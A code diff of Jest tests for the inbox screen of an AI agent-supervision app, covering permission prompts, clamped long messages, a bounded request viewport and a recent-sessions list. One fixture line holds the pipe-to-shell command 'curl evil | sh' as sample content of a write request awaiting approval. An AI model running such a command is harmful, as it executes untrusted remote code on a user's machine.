@@ -32,6 +32,7 @@ import { randomUUID } from 'expo-crypto';
 
 import { dispatchVerityShortcut } from '../../lib/voiceShortcut';
 import { HomeInbox, InboxCard, RESUME_PROMPT, replyFor } from './HomeInbox';
+import { INBOX_LINE_CLAMP, INBOX_REQUEST_MAX_HEIGHT } from '../inbox/InboxFeed';
 
 const ZERO_USAGE = {
   inputTokens: 0,
@@ -453,6 +454,37 @@ it('keeps a write’s content in view next to Allow', async () => {
   expect(screen.getByTestId('inbox-line-code').props.children).toBe('/w/a.sh');
   expect(screen.queryByText('Full request')).toBeNull();
   expect(screen.getByTestId('inbox-request').props.children).toContain('curl evil | sh');
+  // Whole but bounded: a long file would otherwise stretch the card past the screen.
+  const viewport = StyleSheet.flatten(screen.getByTestId('inbox-request-viewport').props.style);
+  expect(viewport).toMatchObject({ maxHeight: INBOX_REQUEST_MAX_HEIGHT });
+});
+
+it('keeps a long message to a session short in the overview, whole one tap away', async () => {
+  // An agent's report to another session ran the full height of the work list.
+  const message = Array.from({ length: 40 }, (_, i) => `Finding ${String(i)}.`).join('\n');
+  await renderInbox([
+    session('messenger', {
+      status: 'awaiting_input',
+      permissionAwaitingInput: true,
+      pendingPermissions: ['t1'],
+      pendingPermissionRequests: [
+        {
+          toolUseId: 't1',
+          tool: 'verity_send_session_message',
+          riskClass: 'ask',
+          input: { targetSessionId: 'other', message },
+        },
+      ],
+    }),
+  ]);
+  await screen.findByRole('button', { name: 'Allow once' });
+  const line = screen.getByTestId('inbox-line-text');
+  expect(line.props.children).toBe(message);
+  expect(line.props.numberOfLines).toBe(INBOX_LINE_CLAMP);
+  // Clamped only because the complete input stays readable under it.
+  expect(screen.queryByTestId('inbox-request')).toBeNull();
+  fireEvent.press(screen.getByText('Full request'));
+  expect(screen.getByTestId('inbox-request').props.children).toContain('Finding 39.');
 });
 
 it('keeps a session with a permission and a ready pull request in one card', async () => {
@@ -781,6 +813,8 @@ it('keeps read results in place, appends new results and clears them only on exp
   expect(labels()).toEqual(['first-result, acme/website', 'second-result, acme/website']);
   view.rerender(page([read, { ...second, lastSeenEventCount: 6 }], 1));
   expect(screen.queryByTestId('work-results')).toBeNull();
+  expect(within(screen.getByTestId('work-recent')).getByText('first-result')).toBeTruthy();
+  expect(within(screen.getByTestId('work-recent')).getByText('second-result')).toBeTruthy();
 });
 
 it('appends a session to its destination category and keeps live actions current', async () => {
@@ -816,6 +850,24 @@ it('appends a session to its destination category and keeps live actions current
   expect(screen.getAllByText('result')).toHaveLength(1);
 });
 
+it('lists recent sessions the sections above do not hold, newest first', async () => {
+  const running = session('working', { status: 'running', lastActivityAt: 90 });
+  const unread = session('unread', { eventCount: 8, lastSeenEventCount: 2, lastActivityAt: 80 });
+  const quiet = Array.from({ length: 12 }, (_, index) =>
+    session(`quiet-${String(index)}`, { lastActivityAt: index + 1 }),
+  );
+  await renderInbox([...quiet, running, unread]);
+  const recent = within(screen.getByTestId('work-recent'));
+  expect(screen.getByText('Recent')).toBeTruthy();
+  // Newest first, the two oldest dropped by the limit, and nothing shown twice.
+  expect(recent.getAllByText(/^quiet-/).map((row) => row.props.children as string)).toEqual(
+    Array.from({ length: 10 }, (_, index) => `quiet-${String(11 - index)}`),
+  );
+  expect(recent.queryByText('working')).toBeNull();
+  expect(recent.queryByText('unread')).toBeNull();
+  expect(screen.getAllByText('working')).toHaveLength(1);
+});
+
 it('drops retained results when they leave the project, are archived or deleted', async () => {
   const client = fakeClient();
   const unread = session('retained', { eventCount: 5, lastSeenEventCount: 2 });
@@ -836,7 +888,8 @@ it('drops retained results when they leave the project, are archived or deleted'
   view.rerender(page([read]));
   expect(screen.getByText('retained')).toBeTruthy();
   view.rerender(page([{ ...read, projectId: 'other' }]));
-  expect(screen.queryByText('retained')).toBeNull();
+  expect(screen.queryByTestId('work-results')).toBeNull();
+  expect(within(screen.getByTestId('work-recent')).getByText('retained')).toBeTruthy();
   view.rerender(page([unread]));
   view.rerender(page([read], [{ ...project, archived: true }]));
   expect(screen.queryByText('retained')).toBeNull();
